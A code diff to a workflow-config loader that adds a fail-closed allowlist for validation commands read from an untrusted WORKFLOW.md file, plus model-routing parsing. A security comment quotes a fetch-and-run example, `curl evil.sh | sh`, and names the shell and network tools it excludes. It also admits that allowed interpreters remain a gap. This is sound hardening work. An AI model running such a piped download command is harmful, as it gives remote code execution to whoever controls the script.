@@ -43,6 +43,7 @@ exports.loadWorkflowConfig = loadWorkflowConfig;
  */
 const fs = __importStar(require("fs"));
 const path = __importStar(require("path"));
+const model_routing_1 = require("./model-routing");
 exports.DEFAULT_WORKFLOW_CONFIG = {
     version: 1,
     source: 'default',
@@ -66,6 +67,71 @@ exports.DEFAULT_WORKFLOW_CONFIG = {
     warnings: [],
 };
 /**
+ * S1 (audit 2026-06-30): allowlist of binaries permitted in WORKFLOW.md
+ * `validation.commands`. WORKFLOW.md is an attacker-controllable input (it lives
+ * in the workspace, not the operator's config), and these commands run via
+ * execFile on the autopilot `complete` path — without this filter, a malicious
+ * workspace could achieve RCE by committing `command: "curl evil.sh | sh"`.
+ *
+ * Fail-closed: anything not listed is dropped + warned. Intentionally excludes
+ * `bash`/`sh`/`curl`/`wget`/`nc`/arbitrary binaries. Residual surface: an
+ * allowlisted interpreter (e.g. `python -c "..."`) can still run arbitrary code
+ * via its own flags; narrowing that requires argument inspection, tracked as a
+ * follow-up. The binary gate already removes the "any binary, zero friction"
+ * RCE path that existed before.
+ */
+const ALLOWED_VALIDATION_BINARIES = new Set([
+    'npm', 'pnpm', 'yarn', 'npx', 'node', 'node.exe',
+    'tsc', 'tsx', 'eslint', 'prettier', 'markdownlint', 'markdownlint-cli2',
+    'vitest', 'jest', 'mocha', 'vite', 'webpack', 'rollup', 'esbuild',
+    'go', 'cargo', 'rustc',
+    'python', 'python3', 'pytest', 'pip', 'pip3',
+    'make', 'cmake', 'dotnet', 'msbuild',
+    'gradle', 'mvn', 'rake', 'bundle', 'swift', 'xcodebuild',
+]);
+/**
+ * Extract the binary (argv[0]) from a command string, honouring single/double
+ * quotes the same way parseCommandArgs does at execution time, so the gate
+ * decides on exactly the token that execFile will spawn.
+ */
+function extractBinary(command) {
+    const s = command.trim();
+    if (!s)
+        return undefined;
+    let bin = '';
+    let inSingle = false;
+    let inDouble = false;
+    for (let i = 0; i < s.length; i++) {
+        const c = s[i];
+        if (c === '"' && !inSingle)
+            inDouble = !inDouble;
+        else if (c === "'" && !inDouble)
+            inSingle = !inSingle;
+        else if (c === ' ' && !inSingle && !inDouble)
+            break;
+        else
+            bin += c;
+    }
+    return bin || undefined;
+}
+/**
+ * S1: drop validation commands whose binary is not on the allowlist.
+ * Mutates `warnings` with one entry per dropped command for observability.
+ */
+function filterValidationCommands(commands, warnings) {
+    const kept = [];
+    for (const cmd of commands) {
+        const bin = extractBinary(cmd.command)?.toLowerCase();
+        if (bin && ALLOWED_VALIDATION_BINARIES.has(bin)) {
+            kept.push(cmd);
+        }
+        else {
+            warnings.push(`Disallowed validation binary "${bin ?? '(empty)'}" in command "${cmd.command.substring(0, 80)}" — dropped (S1 fail-closed)`);
+        }
+    }
+    return kept;
+}
+/**
  * Parse a YAML-like autopilot section from front matter.
  * Minimal parser — only handles the autopilot schema we define.
  * Not a general-purpose YAML parser.
@@ -77,7 +143,7 @@ function parseAutopilotSection(raw) {
     const knownKeys = new Set([
         'version', 'max_concurrent', 'max_retries',
         'stall_timeout_ms', 'max_retry_backoff_ms', 'workspace', 'validation',
-        'destructive_git',
+        'destructive_git', 'model_routing',
     ]);
     for (const key of Object.keys(raw)) {
         if (!knownKeys.has(key)) {
@@ -134,7 +200,7 @@ function parseAutopilotSection(raw) {
             }
         }
         result.validation = {
-            commands,
+            commands: filterValidationCommands(commands, warnings),
             failOnOptional: val.fail_on_optional === true,
         };
     }
@@ -143,6 +209,11 @@ function parseAutopilotSection(raw) {
         result.destructiveGit = {
             allow: dg.allow === true,
         };
+    }
+    if ('model_routing' in raw) {
+        const routing = (0, model_routing_1.parseModelRouting)(raw.model_routing);
+        if (routing)
+            result.modelRouting = routing;
     }
     return { config: result, warnings };
 }
